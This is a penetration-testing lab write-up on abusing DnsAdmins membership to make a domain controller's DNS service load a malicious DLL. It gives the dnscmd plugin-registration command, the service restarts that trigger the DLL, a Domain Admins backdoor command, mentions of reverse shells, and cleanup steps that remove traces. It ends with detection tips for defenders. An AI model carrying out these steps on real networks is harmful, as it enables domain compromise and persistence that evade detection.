# From DnsAdmins to SYSTEM to Domain Compromise

In this lab I'm trying to get code execution with `SYSTEM` level privileges on a DC that runs a DNS service as originally researched by Shay Ber [here](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83).

The attack relies on a [DLL injection](../../offensive-security/t1055-process-injection/dll-injection.md) into the dns service running as SYSTEM on the DNS server which most of the time is on a Domain Contoller.

## Execution

For the attack to work, we need to have compromised a user that belongs to a `DnsAdmins` group on a domain. Luckily, our user `spotless` already belongs to the said group:

```csharp
 net user spotless /domain
```

![](../../.gitbook/assets/screenshot-from-2018-11-11-16-55-52.png)

### Building the DLL

As mentioned earlier, we need to build a DNS plugin DLL that we will be injecting into a dns.exe process on a victim DNS server \(DC\). Below is a screenshot of the DLL exported functions that are expected by the dns.exe binary. I have also added a simple system command to invoke a netcat reverse shell once the plugin is initialized and code is executed. 

I then tested the function with rundll32 as shown below, which returned a reverse shell to my attacking machine:

```csharp
rundll32.exe .\dnsprivesc.dll,DnsPluginInitialize
```

![](../../.gitbook/assets/screenshot-from-2018-11-11-17-30-47.png)

### Abuse DNS with dnscmd

Now that we have the DLL and we checked that it is working, we can ask the victim DC to load our malicious DLL \(from the victim controlled network share on host 10.0.0.2\) next time the service starts \(or the attacker restarts it\):

{% code-tabs %}
{% code-tabs-item title="attacker@victim.memberOfDnsAdmins" %}
```csharp
dnscmd dc01 /config /serverlevelplugindll \\10.0.0.2\tools\dns-priv\dnsprivesc.dll
```
{% endcode-tabs-item %}
{% endcode-tabs %}

The below looks promising and suggests the request to load our malicious DLL was successful:

![](../../.gitbook/assets/screenshot-from-2018-11-11-21-55-59.png)

{% hint style="info" %}
`dnscmd` is a windows utility that allows people with `DnsAdmins` privileges manage the DNS server. The utility can be installed by adding `DNS Server Tools` to your system as shown in the below screengrab.
{% endhint %}

![](../../.gitbook/assets/screenshot-from-2018-11-11-17-04-48.png)

The below command on the victim further suggests that our request was successful:

```csharp
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
```

![](../../.gitbook/assets/screenshot-from-2018-11-11-21-51-21.png)

### Getting code execution with NT\SYSTEM

Now the next time dns service loads/gets restarted, our malicious DLL should be loaded and a reverse shell should be sent back to our attacking system, so let's go and restart the DNS service:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
{% endcode-tabs-item %}
{% endcode-tabs %}

By this point, I should have received a reverse shell, but unfortunately, in my lab, this technique did not work as expected. 

After checking the DNS logs on the `DC01` I saw the below error, suggesting there was something off with my DLL:

![](../../.gitbook/assets/screenshot-from-2018-11-11-21-45-51.png)

I tried exporting functions with C++ name mangling and without and although the DLL exports seemed to be OK per CFF Explorer, I was still not able to make the DC load my malicious DLL successfully without corrupting the dns service:

![](../../.gitbook/assets/screenshot-from-2018-11-11-21-46-09.png)

{% hint style="warning" %}
Although I was not able to correctly injected the DLL without crashing the dns service in my labs, I still decided to publish these notes, just in case they will be stubmled upon by a reader who had successfully injected a custom DLL and who would like to share their thoughts on what I am overlooking - this would be much appreciated.
{% endhint %}

Since I could not get my malicious DLL injected into the dns.exe successfully, I thought of trying to inject the meterpreter payload using the same technique.

It can be observed, that the DLL gets ineed loaded and we receive a call back attempt from meterpreter, but since the DLL does not conform to the required format \(does not have required exported functions\), the session dies immediately:

![](../../.gitbook/assets/screenshot-from-2018-11-11-22-33-58.png)

Since the above suggests that the the DLL code still got executed, we can try asking the DLL to execute the following on the DC:

```csharp
net group 'domain admins' spotless /add /domain
```

```text
dnsprivesc.dll
```

![](../../.gitbook/assets/screenshot-from-2018-11-11-22-55-35.png)

Before restarting the DNS service and getting our malicious DLL executed, let's make sure our attacking user spotless is not in `Domain Admins` group:

![](../../.gitbook/assets/screenshot-from-2018-11-11-23-03-40.png)

Now if we restart the DNS service which will load our addDA.dll, we see that the user spotless is now a member of the `Domain Admins`:

![](../../.gitbook/assets/screenshot-from-2018-11-11-23-03-52.png)

{% hint style="danger" %}
Warning: at this time the DNS service is probably crashed, so be warned - this is not the stealthiest method and the activity probably will get picked up by defenders real quick unless you can restore the DNS service immediately.
{% endhint %}

Below confirms that the dns service is down, however we can still access the DC C$ share by DC's IP:

![](../../.gitbook/assets/screenshot-from-2018-11-11-23-09-23.png)

You could think about scripting/automating the after-attack cleanup and DNS service restoration and include the required code in the same malicious DLL that creates a backdoor user in the first place:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
reg query \\10.0.0.6\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
reg delete \\10.0.0.6\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
sc.exe \\10.0.0.6 stop dns
sc.exe \\10.0.0.6 start dns
//remove any other traces/logs
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2018-11-11-23-21-55.png)

We can now access the C$ using DC01 computer name:

![](../../.gitbook/assets/screenshot-from-2018-11-11-23-24-44.png)

### Bonus Reminder

It turns out that the reason the meterpreter shell failed was a classic mistake of not using the right staged/non-staged payloads - always double check your payloads vs listeners. 

Once I set up the listener correctly, the meterpreter shell came back as expected:

![](../../.gitbook/assets/peek-2018-11-12-21-58.gif)

## Observations

As a defender, one should be suspicious of child processes spawned by dns.exe on DCs:

![](../../.gitbook/assets/screenshot-from-2018-11-12-22-09-43.png)

Also, you may want to consider monitoring HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters value `ServerLevelPluginDll`

## References

{% embed url="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83" %}

{% embed url="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html" %}

{% embed url="https://github.com/dim0x69/dns-exe-persistance" %}

